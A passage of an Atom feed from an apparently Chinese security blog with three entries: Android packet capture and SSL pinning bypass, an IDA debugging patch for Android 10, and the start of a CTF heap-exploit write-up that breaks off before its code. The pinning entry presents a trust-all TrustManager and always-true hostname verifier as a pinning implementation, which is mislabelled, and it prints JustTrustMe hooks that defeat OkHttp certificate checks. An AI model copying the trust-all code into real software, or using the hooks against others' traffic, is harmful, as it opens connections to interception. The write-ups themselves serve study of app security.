<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0wl’s Blog</title>
  <icon>https://www.0wl.site/icon.png</icon>
  
  <link href="https://www.0wl.site/atom.xml" rel="self"/>
  
  <link href="https://www.0wl.site/"/>
  <updated>2022-10-09T13:18:17.313Z</updated>
  <id>https://www.0wl.site/</id>
  
  <author>
    <name>0wl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安卓抓包总结</title>
    <link href="https://www.0wl.site/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/"/>
    <id>https://www.0wl.site/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/</id>
    <published>2022-10-05T07:10:05.000Z</published>
    <updated>2022-10-09T13:18:17.313Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>关于抓包这一块的总结</p></div></article><span id="more"></span><p>[toc]</p><h2 id="环境配置">环境配置</h2><p>下面环境配置都是在真机上进行的，模拟器同理</p><h3 id="Charles">Charles</h3><p>官网下载 Charles 并安装</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_7a14cc57f039b0f7a175629fc8fee8bc.png" class=""><p>按提示设置代理并下载根证书到模拟器/真机</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_38f398cca873e8e9ae5e2a758864b7e6.png" class=""><p>ip 和 端口设置成上面提到的，ip 就是本机 ip，注意此时手机与电脑需要在同一个局域网下（比如连接同一个 wifi 或热点），<code>Charles Proxy -&gt; Proxy Settings</code> 内可以修改端口</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_f6dfe57480eafe5e8817cf96bb13290a.png" class=""><p>如需配置抓包 https 可以在 <code>Charles Proxy -&gt;SSL Proxy Settings</code> 添加 443 端口</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_845bae239572accde1e0ff9004016d22.png" class=""><ul><li>Android 7.0 以上默认不信任用户安装的证书，为了让我们安装的证书成为系统证书需要安装插件，<a href="https://github.com/NVISOsecurity/MagiskTrustUserCerts">MagiskTrustUserCerts</a> 这个插件可以让用户证书成为系统信任证书</li></ul><h3 id="Burp">Burp</h3><p>burp 设置代理，ip 为本机 ip，端口随意</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_c5c9f5cb2c98053937a42473eac0cdcd.png" class=""><p>手机跟配置 charles 时一样设置对应的 ip 和端口，同样安装 burp 的 CA 证书到系统证书</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_213d4055dc15150b3a3cb9b827317d39.png" class=""><h3 id="抓不到包的情况">抓不到包的情况</h3><p>比如 OkHttp 中配置 NO_PROXY、curl 发送 http 请求等没有经过系统代理的情况下按之前的抓包方法是抓不到的，需要在手机上通过 VPN 转发后才能抓包</p><p>VPN 代理软件有</p><ul><li>HttpCanary（直接手机上抓包，个人感觉比较好用）</li><li>Postern（抓包工具需配置 socks 代理）</li><li>Drony</li></ul><h2 id="绕过-SSL-Pinning">绕过 SSL Pinning</h2><p>SSL Pinning 会让我们前面提到的抓包方法失效，绕过后即可正常抓包，在讲 SSL Pinning 前先来了解下加密通信相关的前置知识。</p><h3 id="CA-证书">CA 证书</h3><h3 id="HTTPS-单向验证与双向验证">HTTPS 单向验证与双向验证</h3><h4 id="单向认证">单向认证</h4><ul><li>客户端向服务端发送一个明文 http 请求</li><li>服务器向客户端发送 CA 证书</li><li>客户端收到 CA 证书后用公钥（操作系统和浏览器自带）解密，验证数字签名成功后获得 B_公钥</li><li>客户端生成随机数密钥 F，用前面的 B_公钥加密发给服务端</li><li>服务端用自己的 B_私钥解密得到 F</li><li>之后双方用密钥 F 通信</li></ul><p>客户端通过 CA 证书验证服务器，以此防止中间人攻击</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_18d56f9b53fc48bc81a6dca2f52bdbe1.png" class=""><h4 id="双向认证">双向认证</h4><p>和单向认证相比，双向认证增加了服务器验证客户端的环节，客户端会发送证书给服务端</p><img src="/2022/10/05/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/upload_2c86991d6267e71b0924aed4fc219396.png" class="" title="img"><h3 id="SSL-pinning-及其实现">SSL pinning 及其实现</h3><p><code>SSL Pinning</code> 是一种防止中间人攻击的策略，通过客户端<strong>内置证书</strong>防范伪造服务器证书，<code>SSL Pinning</code> 分为证书绑定和公钥绑定</p><ul><li>证书绑定：客户端代码内置服务端证书的一部分字节码，与服务器通信时会将证书与内置部分比对，不匹配就会报错</li><li>公钥绑定：客户端内置证书公钥，通过与服务器证书公钥比对确认连接</li></ul><h4 id="HttpsURLConnection-实现">HttpsURLConnection 实现</h4><ol><li>自定义 SSLSocketFactory 实现，继承并重写 TrustManager 的 checkClientTrusted 和 checkServerTrusted 方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> HttpsURLConnection <span class="title">getHttpsURLConnection</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">        HttpsURLConnection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            SSLContext sc = SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sc.init(<span class="keyword">null</span>,<span class="keyword">new</span> TrustManager[]&#123;<span class="keyword">new</span> MyTrustManager()&#125;,<span class="keyword">new</span> SecureRandom());</span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());</span><br><span class="line">            HttpsURLConnection.setDefaultHostnameVerifier(<span class="keyword">new</span> MyHostnameVerifier());</span><br><span class="line">            conn = (HttpsURLConnection) <span class="keyword">new</span> URL(url).openConnection();</span><br><span class="line">            conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">            conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyHostnameVerifier</span> <span class="keyword">implements</span> <span class="title">HostnameVerifier</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String s, SSLSession sslSession)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyTrustManager</span> <span class="keyword">implements</span> <span class="title">X509TrustManager</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkClientTrusted</span><span class="params">(X509Certificate[] x509Certificates, String s)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkServerTrusted</span><span class="params">(X509Certificate[] x509Certificates, String s)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> X509Certificate[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="OkHttp-实现">OkHttp 实现</h4><ol start="2"><li>CertificatePinner 证书锁定，证书公钥的哈希值可以在<a href="https://www.ssllabs.com/ssltest/index.html">这里</a>获取</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> String CA_DOMAIN =<span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OkHttpCertificatePinner</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        CertificatePinner certificatePinner = <span class="keyword">new</span> CertificatePinner.Builder()</span><br><span class="line">                .add(CA_DOMAIN,<span class="string">&quot;sha256/Zhv4cvwdHmEmE0edWEcIdmLfwsqxrrOmp+vbngwNnrU=&quot;</span>)</span><br><span class="line">                .add(CA_DOMAIN,<span class="string">&quot;sha256/hETpgVvaLC0bvcGG3t0cuqiHvr4XyP2MTwCiqhgRWwU=&quot;</span>)</span><br><span class="line">                .add(CA_DOMAIN,<span class="string">&quot;sha256/cGuxAXyFXFkWm61cF4HPWX8S0srS9j0aSqN0k4AP+4A=&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        OkHttpClient client = <span class="keyword">new</span> OkHttpClient.Builder().certificatePinner(certificatePinner)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                .url(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        Call call = client.newCall(request);</span><br><span class="line">        Response response = call.execute();</span><br><span class="line">        Log.d(<span class="string">&quot;OkHttp&quot;</span>,response.body().string());</span><br><span class="line">        <span class="comment">// 异步请求</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        call.enqueue(new Callback() &#123;</span></span><br><span class="line"><span class="comment">            @Override</span></span><br><span class="line"><span class="comment">            public void onFailure(Call call, IOException e) &#123;</span></span><br><span class="line"><span class="comment">                Log.d(&quot;OkHttp&quot;, e.getMessage());</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            @Override</span></span><br><span class="line"><span class="comment">            public void onResponse(Call call, okhttp3.Response response) throws IOException &#123;</span></span><br><span class="line"><span class="comment">                Log.d(&quot;OkHttp&quot;, response.body().string());</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;);</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="如何绕过">如何绕过</h3><p><code>justTrustMe</code> 这一插件能够 hook 掉证书验证从而实现绕过 SSL Pinning，不过 <a href="https://github.com/Fuzion24/JustTrustMe">https://github.com/Fuzion24/JustTrustMe</a> Release 里的版本是 2016 年的，需要自己编译一份再使用</p><p>当然 <code>justTrustMe</code> 不能绕过所有的 <code>SSL Pinning</code> ，部分魔改的证书校验需要自己写 hook 脚本绕过，因此需要了解下 <code>justTrustMe</code> 都 hook 了哪些函数</p><h3 id="justTrustMe-源码分析">justTrustMe 源码分析</h3><p>这里主要关注 OkHttp，函数 processOkHttp 是来处理 OkHttp 部分的</p><ul><li>首先针对 2.5 版本的 okhttp hook 了 <code>com.squareup.okhttp.CertificatePinner.check(String,List)</code>，该方法内对传入的 <code>hostname</code> 的证书和代码内置的公钥哈希做一个匹配，如不匹配则返回 false，这里通过 hook 使其始终返回 true</li><li>接下来针对 3.X 版本的 okhttp ，同样 hook 了 <code>okhttp3.CertificatePinner.check(String,List)</code> 始终返回 true，还 hook 了 <code>okhttp3.internal.tls.OkHostnameVerifier.verify</code> 的两个函数，绕过域名校验</li><li>4.2.0+ 版本 okhttp 源码改用 kotlin 写，同样hook 了 <code>okhttp3.CertificatePinner.check</code> 三个重载</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processOkHttp</span><span class="params">(ClassLoader classLoader)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* hooking OKHTTP by SQUAREUP */</span></span><br><span class="line">        <span class="comment">/* com/squareup/okhttp/CertificatePinner.java available online @ https://github.com/square/okhttp/blob/okhttp_27/okhttp/src/main/java/com/squareup/okhttp/CertificatePinner.java */</span></span><br><span class="line">        <span class="comment">/* public void check(String hostname, List&lt;Certificate&gt; peerCertificates) throws SSLPeerUnverifiedException&#123;&#125;*/</span></span><br><span class="line">        <span class="comment">/* Either returns true or a exception so blanket return true */</span></span><br><span class="line">        <span class="comment">/* Tested against version 2.5 */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking com.squareup.okhttp.CertificatePinner.check(String,List) (2.5) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;com.squareup.okhttp.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;com.squareup.okhttp.CertificatePinner&quot;</span>,</span><br><span class="line">                    classLoader,</span><br><span class="line">                    <span class="string">&quot;check&quot;</span>,</span><br><span class="line">                    String.class,</span><br><span class="line">                    List.class,</span><br><span class="line">                    <span class="keyword">new</span> XC_MethodReplacement() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">protected</span> Object <span class="title">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 2.5 not found in &quot;</span> + currentPackageName + <span class="string">&quot;-- not hooking&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/CertificatePinner.java#L144</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking okhttp3.CertificatePinner.check(String,List) (3.x) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>,</span><br><span class="line">                    classLoader,</span><br><span class="line">                    <span class="string">&quot;check&quot;</span>,</span><br><span class="line">                    String.class,</span><br><span class="line">                    List.class,</span><br><span class="line">                    DO_NOTHING);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>,</span><br><span class="line">                    classLoader,</span><br><span class="line">                    <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                    String.class,</span><br><span class="line">                    javax.net.ssl.SSLSession.class,</span><br><span class="line">                    <span class="keyword">new</span> XC_MethodReplacement() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">protected</span> Object <span class="title">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking OkHostnameVerifier.verify(String, SSLSession)&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>,</span><br><span class="line">                    classLoader,</span><br><span class="line">                    <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                    String.class,</span><br><span class="line">                    java.security.cert.X509Certificate.class,</span><br><span class="line">                    <span class="keyword">new</span> XC_MethodReplacement() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">protected</span> Object <span class="title">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking OkHostnameVerifier.verify(String, X509)(&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/okhttp_4.2.x/okhttp/src/main/java/okhttp3/CertificatePinner.kt</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking okhttp3.CertificatePinner.check(String,List) (4.2.0+) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>,</span><br><span class="line">                    classLoader,</span><br><span class="line">                    <span class="string">&quot;check$okhttp&quot;</span>,</span><br><span class="line">                    String.class,</span><br><span class="line">                    <span class="string">&quot;kotlin.jvm.functions.Function0&quot;</span>,</span><br><span class="line">                    DO_NOTHING);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XposedHelpers.ClassNotFoundError | ClassNotFoundException | NoSuchMethodError e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 4.2.0+ (check$okhttp) not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>,</span><br><span class="line">                    classLoader,</span><br><span class="line">                    <span class="string">&quot;check&quot;</span>,</span><br><span class="line">                    String.class,</span><br><span class="line">                    List.class,</span><br><span class="line">                    DO_NOTHING);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XposedHelpers.ClassNotFoundError | ClassNotFoundException | NoSuchMethodError e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 4.2.0+ (check) not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这块还是需要看看 OkHttp 源码的</p><h2 id="参考">参考</h2><ul><li><a href="https://juejin.cn/post/6992844908788711438">安卓 https 证书校验和绕过 </a></li><li><a href="https://juejin.cn/post/6844903809068564493">扯一扯HTTPS单向认证、双向认证、抓包原理、反抓包策略 </a></li><li><a href="https://www.jianshu.com/p/80282c1b3cff">Android安全防护–Volley/OkHttp SSL Pinning</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;关于抓包这一块的总结&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="android" scheme="https://www.0wl.site/tags/android/"/>
    
    <category term="re" scheme="https://www.0wl.site/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>ida android_server 在 Android10 不显示线程的解决方案</title>
    <link href="https://www.0wl.site/2022/05/06/ida-android-server-%E5%9C%A8-Android10-%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://www.0wl.site/2022/05/06/ida-android-server-%E5%9C%A8-Android10-%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2022-05-06T08:44:44.000Z</published>
    <updated>2022-05-06T08:53:18.366Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>android10 调试遇到的问题</p></div></article><span id="more"></span><blockquote><p>Android 10 或更高版本采用<strong>模块化方式</strong>来处理一些 Android 系统组件，使其能够在 Android 的常规发布周期外的时间进行更新</p></blockquote><p>​其中 <a href="http://libc.so">libc.so</a> 被封装到 Runtime 模块</p><p>​进程加载的 <a href="http://libc.so">libc.so</a> 的真实路径应该为 <code>/apex/com.android.runtime/lib/bionic/libc.so</code></p><img src="/2022/05/06/ida-android-server-%E5%9C%A8-Android10-%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20220506164857983.png" class=""><p>​android_server 内校验的 <a href="http://libc.so">libc.so</a> 路径为 <code>/system/lib/libc.so</code> ，可以设置 <code>IDA_LIBC_PATH = /apex/com.android.runtime/lib/bionic/libc.so</code> 解决问题</p><p>​当然直接把 android_server 里的校验 patch 掉也行，以 IDA7.5 为例</p><img src="/2022/05/06/ida-android-server-%E5%9C%A8-Android10-%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20220506164921449.png" class=""><p>​<code>patch</code> 掉一个 <code>strcmp</code> 就行</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;android10 调试遇到的问题&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="android" scheme="https://www.0wl.site/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>BUU-ciscn_2019_s_1</title>
    <link href="https://www.0wl.site/2022/04/05/BUU-ciscn-2019-s-1/"/>
    <id>https://www.0wl.site/2022/04/05/BUU-ciscn-2019-s-1/</id>
    <published>2022-04-05T12:40:40.000Z</published>
    <updated>2022-04-05T13:52:01.816Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>复习下 off-by-null</p></div></article><span id="more"></span><h2 id="漏洞点">漏洞点</h2><ul><li><code>edit</code> 中存在 <code>off-by-null</code>，但是 <code>edit</code> 功能受到次数限制</li></ul><ul><li>有 <code>show</code> 功能但是需要 key2 &gt; 0 才能用</li></ul><ul><li>限制 <code>edit</code> 和 <code>show</code> 功能的 <code>key1 key2</code> 相邻，可以同时改掉</li></ul><h2 id="思路">思路</h2><ul><li>一次 <code>off-by-null</code> 构造出两个可以 <code>uaf</code> 的堆块</li><li>利用 <code>tcache dup</code> 把 <code>key1 key2</code> 都改掉，这样就可以多次调用 <code>edit</code> 并开启 <code>show</code> 功能</li><li>利用 <code>show</code> 获得 <code>libc</code> 基址</li><li>再次 <code>tcache dup</code> 劫持 <code>__free_hook</code> 为 <code>system</code> （因为第一次 <code>tcache dup</code> 已经把对应大小的 <code>tcache</code> 链表打炸了所以第二次换了个大小）</li></ul><h2 id="exp">exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 